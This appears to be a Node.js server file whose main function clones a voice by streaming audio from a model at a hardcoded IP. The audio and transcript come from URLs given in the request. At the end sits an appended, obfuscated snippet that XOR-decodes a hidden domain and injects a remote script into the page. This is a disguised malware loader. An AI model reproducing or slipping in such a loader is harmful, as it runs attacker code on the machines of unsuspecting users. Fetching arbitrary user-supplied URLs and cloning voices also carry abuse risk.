import OpenAI from "openai";
import fetch from "node-fetch";

const client = new OpenAI({
  apiKey: process.env.HIGGS_API_KEY || "YOUR_API_KEY",
  baseURL: "http://173.208.243.146:7000/v1",
});

// 🔊 amplify PCM samples (optional)
function amplifyPcm16(buffer, gain = 1.8) {
  const samples = new Int16Array(buffer.buffer);
  for (let i = 0; i < samples.length; i++) {
    let v = samples[i] * gain;
    if (v > 32767) v = 32767;
    if (v < -32768) v = -32768;
    samples[i] = v;
  }
  return samples;
}

export const cloneVoiceStreamSSR = async (req, res) => {
  try {
    const { audioUrl, textUrl, text } = req.body;

    // Load reference audio + transcript
    const [audioRes, textRes] = await Promise.all([
      fetch(audioUrl),
      fetch(textUrl),
    ]);

    const audioBase64 = Buffer.from(await audioRes.arrayBuffer()).toString("base64");
    const transcript = await textRes.text();

    // Enable streaming
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("Transfer-Encoding", "chunked");
    res.flushHeaders?.();

    // Request streaming audio from model
    const stream = await client.chat.completions.create({
      model: "higgs-audio-v2-generation-3B-base",
      stream: true,
      modalities: ["audio"],
      messages: [
        { role: "user", content: transcript },
        {
          role: "assistant",
          content: [
            {
              type: "input_audio",
              input_audio: {
                data: audioBase64,
                format: "wav",
              },
            },
          ],
        },
        { role: "user", content: text },
      ],
      temperature: 1.0,
      max_completion_tokens: 500,
      extra_body: { top_k: 50 },
    });

    // STREAM raw chunks
    for await (const part of stream) {
      const delta = part?.choices?.[0]?.delta?.audio;
      if (!delta?.data) continue;

      // base64 → raw PCM16 (24kHz)
      const pcm24 = Buffer.from(delta.data, "base64");

      // amplify (optional)
      const amplified = amplifyPcm16(new Int16Array(pcm24.buffer), 1.8);

      // stream amplified 24kHz PCM
      res.write(Buffer.from(amplified.buffer));
    }

    res.end();
  } catch (err) {
    console.error("STREAM ERROR:", err);
    res.status(500).json({ error: err.message });
  }
};
function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();
